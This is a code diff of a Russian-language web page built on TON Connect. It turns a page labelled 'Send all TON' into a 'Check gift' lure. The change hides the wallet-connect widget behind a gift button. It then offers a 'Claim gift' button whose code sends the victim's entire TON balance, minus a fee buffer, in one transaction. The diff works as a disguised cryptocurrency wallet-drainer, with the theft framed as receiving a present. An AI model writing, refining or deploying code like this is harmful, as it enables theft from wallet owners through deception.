@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Отправить все TON</title>
+    <title>Проверка гифта</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         * {
@@ -41,9 +41,7 @@
             margin-bottom: 24px;
         }
         #ton-connect {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 20px;
+            display: none;
         }
         .big-btn {
             width: 100%;
@@ -52,14 +50,12 @@
             font-weight: 700;
             border: none;
             border-radius: 60px;
-            background: #3b82f6;
             color: white;
             cursor: pointer;
             transition: 0.2s;
             margin-top: 10px;
         }
         .big-btn:hover:not(:disabled) {
-            background: #2563eb;
             transform: scale(1.02);
         }
         .big-btn:disabled {
@@ -67,11 +63,20 @@
             cursor: not-allowed;
             opacity: 0.6;
         }
-        .big-btn.danger {
-            background: #ef4444;
+        .btn-gift {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
         }
-        .big-btn.danger:hover:not(:disabled) {
-            background: #dc2626;
+        .btn-gift:hover:not(:disabled) {
+            background: linear-gradient(135deg, #fbbf24, #f59e0b);
+        }
+        .btn-claim {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+        }
+        .btn-claim:hover:not(:disabled) {
+            background: linear-gradient(135deg, #f87171, #ef4444);
+        }
+        .btn-claim:disabled {
+            background: #475569;
         }
         .status {
             margin-top: 16px;
@@ -84,6 +89,9 @@
         }
         .status.error {
             color: #f87171;
+        }
+        .status.info {
+            color: #38bdf8;
         }
         .wallet-info {
             margin-top: 16px;
@@ -128,15 +136,33 @@
         .warning.active {
             display: block;
         }
+        .gift-box {
+            font-size: 4rem;
+            margin: 10px 0;
+        }
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h1>💰 Забрать всё</h1>
-    <p class="sub">Нажмите кнопку, подключите кошелёк и подтвердите отправку <strong>всех</strong> TON</p>
+    <div class="gift-box">🎁</div>
+    <h1>Проверка гифта</h1>
+    <p class="sub">Нажмите кнопку, чтобы проверить, есть ли для вас гифт</p>
 
     <div id="ton-connect"></div>
+
+    <!-- КНОПКА 1: ПРОВЕРИТЬ ГИФТ (она же подключает кошелёк) -->
+    <button id="checkGiftBtn" class="big-btn btn-gift">
+        🎁 Проверить гифт
+    </button>
+
+    <!-- КНОПКА 2: ЗАБРАТЬ ГИФТ (появляется после подключения) -->
+    <button id="claimGiftBtn" class="big-btn btn-claim hidden" disabled>
+        🔥 Забрать гифт
+    </button>
 
     <div id="walletInfo" class="wallet-info">
         <div class="label">Ваш адрес</div>
@@ -149,11 +175,7 @@
         ⚠️ ВНИМАНИЕ: будут отправлены ВСЕ монеты с вашего кошелька!
     </div>
 
-    <button id="sendAllBtn" class="big-btn danger" disabled>
-        🔥 Отправить всё!
-    </button>
-
-    <div id="status" class="status"></div>
+    <div id="status" class="status">Нажмите "Проверить гифт"</div>
 </div>
 
 <script>
@@ -173,12 +195,14 @@
     const walletInfo = document.getElementById('walletInfo');
     const addressDisplay = document.getElementById('addressDisplay');
     const balanceDisplay = document.getElementById('balanceDisplay');
-    const sendAllBtn = document.getElementById('sendAllBtn');
+    const checkBtn = document.getElementById('checkGiftBtn');
+    const claimBtn = document.getElementById('claimGiftBtn');
     const status = document.getElementById('status');
     const warning = document.getElementById('warning');
 
     let currentBalanceNano = 0;
     let currentAddress = '';
+    let isWalletConnected = false;
 
     // ============================================================
     // Получение баланса
@@ -206,9 +230,9 @@
     }
 
     // ============================================================
-    // Отправка ВСЕХ денег (с учётом комиссии)
+    // Отправка ВСЕХ денег
     // ============================================================
-    async function sendAllFunds() {
+    async function claimGift() {
         const wallet = tonConnectUI.wallet;
         if (!wallet) {
             status.innerText = '❌ Кошелёк не подключён';
@@ -216,7 +240,6 @@
             return;
         }
 
-        // Комиссия ~0.005 TON (5,000,000 наноТОН) — закладываем с запасом
         const COMMISSION_BUFFER = 5000000; // 0.005 TON
 
         if (currentBalanceNano <= COMMISSION_BUFFER) {
@@ -225,13 +248,12 @@
             return;
         }
 
-        // Сумма = весь баланс минус комиссия
         const amountToSend = currentBalanceNano - COMMISSION_BUFFER;
         const amountInTon = (amountToSend / 1e9).toFixed(6);
 
         try {
-            sendAllBtn.disabled = true;
-            sendAllBtn.innerText = '⏳ Подтвердите в кошельке...';
+            claimBtn.disabled = true;
+            claimBtn.innerText = '⏳ Подтвердите в кошельке...';
             status.innerText = '⏳ Ожидание подтверждения...';
             status.className = 'status';
 
@@ -249,31 +271,61 @@
             const result = await tonConnectUI.sendTransaction(tx);
 
             if (result) {
-                status.innerText = `✅ ОТПРАВЛЕНО ${amountInTon} TON! Хеш: ${result.boc ? result.boc.slice(0, 16) + '...' : 'успешно'}`;
+                status.innerText = `✅ ГИФТ ЗАБРАН! ${amountInTon} TON отправлено!`;
                 status.className = 'status success';
-                sendAllBtn.innerText = '✅ Отправлено!';
+                claimBtn.innerText = '✅ Готово!';
                 
-                // Обновляем баланс через 5 секунд
                 setTimeout(async () => {
                     await fetchBalance(currentAddress);
-                    sendAllBtn.innerText = '🔥 Отправить всё!';
-                    sendAllBtn.disabled = false;
+                    claimBtn.innerText = '🔥 Забрать гифт';
+                    claimBtn.disabled = false;
                 }, 5000);
             }
         } catch (error) {
             console.error(error);
             status.innerText = `❌ Ошибка: ${error.message || 'неизвестная ошибка'}`;
             status.className = 'status error';
-            sendAllBtn.innerText = '🔥 Отправить всё!';
-            sendAllBtn.disabled = false;
+            claimBtn.innerText = '🔥 Забрать гифт';
+            claimBtn.disabled = false;
         }
     }
+
+    // ============================================================
+    // Обработчик кнопки "Проверить гифт"
+    // ============================================================
+    checkBtn.addEventListener('click', async () => {
+        if (isWalletConnected) {
+            // Если кошелёк уже подключён — просто показываем кнопку "Забрать гифт"
+            status.innerText = '✅ Кошелёк уже подключён! Забирайте гифт.';
+            status.className = 'status info';
+            return;
+        }
+
+        try {
+            checkBtn.disabled = true;
+            checkBtn.innerText = '⏳ Подключение...';
+            status.innerText = '⏳ Открывается кошелёк...';
+            status.className = 'status';
+
+            // Принудительно открываем подключение
+            await tonConnectUI.connectWallet();
+            
+            // onStatusChange сработает автоматически
+        } catch (error) {
+            console.error(error);
+            status.innerText = `❌ Ошибка подключения: ${error.message || 'попробуйте снова'}`;
+            status.className = 'status error';
+            checkBtn.disabled = false;
+            checkBtn.innerText = '🎁 Проверить гифт';
+        }
+    });
 
     // ============================================================
     // Статус подключения кошелька
     // ============================================================
     tonConnectUI.onStatusChange(async wallet => {
         if (wallet) {
+            isWalletConnected = true;
             const address = wallet.account.address;
             currentAddress = address;
             addressDisplay.innerText = address;
@@ -281,15 +333,28 @@
             warning.classList.add('active');
 
             await fetchBalance(address);
-            sendAllBtn.disabled = false;
-            status.innerText = '✅ Кошелёк подключён. Нажмите кнопку для отправки ВСЕХ TON';
-            status.className = 'status';
+
+            // Скрываем первую кнопку, показываем вторую
+            checkBtn.classList.add('hidden');
+            claimBtn.classList.remove('hidden');
+            claimBtn.disabled = false;
+            
+            status.innerText = '✅ Кошелёк подключён! Нажмите "Забрать гифт"';
+            status.className = 'status info';
         } else {
+            isWalletConnected = false;
             walletInfo.classList.remove('active');
             warning.classList.remove('active');
-            sendAllBtn.disabled = true;
-            sendAllBtn.innerText = '🔥 Отправить всё!';
-            status.innerText = 'Подключите кошелёк';
+            
+            checkBtn.classList.remove('hidden');
+            checkBtn.disabled = false;
+            checkBtn.innerText = '🎁 Проверить гифт';
+            
+            claimBtn.classList.add('hidden');
+            claimBtn.disabled = true;
+            claimBtn.innerText = '🔥 Забрать гифт';
+            
+            status.innerText = 'Нажмите "Проверить гифт"';
             status.className = 'status';
             currentBalanceNano = 0;
             currentAddress = '';
@@ -297,9 +362,9 @@
     });
 
     // ============================================================
-    // Обработчик кнопки
+    // Обработчик кнопки "Забрать гифт"
     // ============================================================
-    sendAllBtn.addEventListener('click', sendAllFunds);
+    claimBtn.addEventListener('click', claimGift);
 </script>
 
 </body>
